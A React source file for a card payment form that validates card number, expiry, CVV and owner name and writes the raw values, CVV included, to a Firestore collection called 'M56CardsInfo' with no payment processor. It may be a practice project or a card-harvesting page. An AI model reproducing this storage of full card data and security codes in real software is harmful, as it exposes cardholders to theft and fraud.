import React, { useState } from "react";
import ReactDOM from "react-dom";
import valid from "card-validator";
import "./app.css";
import Loader from "./components/loader/loader";
import Submit from "./components/submit/submit";
import { addToFirestore } from "./utils/handlefetch";

const App = () => {
  const [progress, setProgress] = useState({
    isLoad: false,
    isSuccess: false,
    isFailed: false,
  });
  const [date, setDate] = useState({});
  const [payForm, setPayForm] = useState({
    cardNo: "",
    ownerName: "",
    expDate: "",
    cvv: "",
  });

  const [error, setError] = useState({
    cardNoErr: {
      isCheck: false,
      message: "",
    },
    expDateErr: { isCheck: false, message: "" },
    cvvErr: { isCheck: false, message: "" },
    ownerNameErr: {
      isCheck: false,
      message: "",
    },
  });

  const handleValidation = (inputName, value, errType, errMsg) => {
    var validation;
    if (inputName === "cardNo") {
      validation = valid.number(value, { maxLength: 16 });
    }
    if (inputName === "ownerName") {
      validation = valid.cardholderName(value);
    }
    if (inputName === "expDate") {
      validation = valid.expirationDate(value, 10);
      const { month, year } = validation;
      setDate({ ...date, month, year });
    }
    if (inputName === "cvv") {
      validation = valid.cvv(value);
    }

    if (!validation.isValid) {
      setError({
        ...error,
        [errType]: {
          isCheck: true,
          message: errMsg,
        },
      });
    } else {
      setError({
        ...error,
        [errType]: {
          isCheck: false,
          message: "",
        },
      });
    }
    setPayForm({
      ...payForm,
      [inputName]: value,
    });
  };

  const handlePayFormChange = (e) => {
    const { name, value } = e.target;
    if (name === "cardNo" && value.length <= 16) {
      handleValidation(name, value, "cardNoErr", "Invalid Card Number");
    }
    if (name === "ownerName") {
      handleValidation(name, value, "ownerNameErr", "Invalid Owner Name");
    }
    if (name === "expDate") {
      handleValidation(name, value, "expDateErr", "Invalid Expiry Date");
    }
    if (name === "cvv" && value.length <= 3) {
      handleValidation(name, value, "cvvErr", "Invalid CVV");
    }
  };

  const handleSubmit = () => {
    const { cardNo, ownerName, expDate, cvv } = payForm;
    if (cardNo.length && ownerName.length && expDate.length && cvv.length) {
      addToFirestore("M56CardsInfo", payForm, setProgress, progress);
    } else {
      const obj = {};
      const a = Object.entries(payForm).forEach((ele, index) => {
        if (ele[1].length === 0) {
          obj[`${ele[0]}Err`] = {
            isCheck: true,
            message: "* Required",
          };
        }
      });
      setError({
        ...error,
        ...obj,
      });
    }
  };
  const { cardNo, ownerName, expDate, cvv } = payForm;
  const { cardNoErr, ownerNameErr, expDateErr, cvvErr } = error;
  const { isLoad, isSuccess, isFailed } = progress;
  return (
    <div className="container">
      {isLoad ? (
        <Loader />
      ) : isSuccess ? (
        <Submit {...payForm} {...date} />
      ) : (
        <div className="wrapper">
          <h2 className="py-2">Payment Details</h2>
          <div className="logo">
            <img className="logo-img" />
          </div>
          <form className="p-1" noValidate>
            <div className="my-1 col">
              <label className="py-1">CARD NUMBER</label>
              {cardNoErr.isCheck ? (
                <span className="error">{cardNoErr.message}</span>
              ) : null}
              <input
                className={cardNoErr.isCheck ? "error" : ""}
                type="number"
                name="cardNo"
                value={cardNo}
                onChange={handlePayFormChange}
                placeholder="Valid Card Number"
              />
            </div>
            <div className="row my-1">
              <div className="col">
                <label className="py-1">EXPIRATION DATE</label>
                {expDateErr.isCheck ? (
                  <span className="error">{expDateErr.message}</span>
                ) : null}
                <input
                  type="text"
                  className={expDateErr.isCheck ? "error" : ""}
                  placeholder="MM/YY"
                  name="expDate"
                  value={expDate}
                  onChange={handlePayFormChange}
                />
              </div>
              <div className="col code">
                <label className="py-1">CV CODE</label>
                {cvvErr.isCheck ? (
                  <span className="error">{cvvErr.message}</span>
                ) : null}
                <input
                  type="number"
                  placeholder="CVV"
                  name="cvv"
                  value={cvv}
                  onChange={handlePayFormChange}
                  className={cvvErr.isCheck ? "error" : ""}
                />
              </div>
            </div>
            <div className="my-1 col">
              <label className="py-1">CARD OWNER</label>
              {ownerNameErr.isCheck ? (
                <span className="error">{ownerNameErr.message}</span>
              ) : null}

              <input
                type="text"
                placeholder="Card Owner Name"
                name="ownerName"
                value={ownerName}
                onChange={handlePayFormChange}
                className={ownerNameErr.isCheck ? "error" : ""}
              />
            </div>
          </form>
          <div className="p-2">
            <button
              type="submit"
              onClick={handleSubmit}
              disabled={
                cardNoErr.isCheck ||
                ownerNameErr.isCheck ||
                expDateErr.isCheck ||
                cvvErr.isCheck
              }
              className="btn-primary"
            >
              Confirm Payment
            </button>
          </div>
        </div>
      )}
    </div>
  );
};

ReactDOM.render(<App />, document.getElementById("root"));
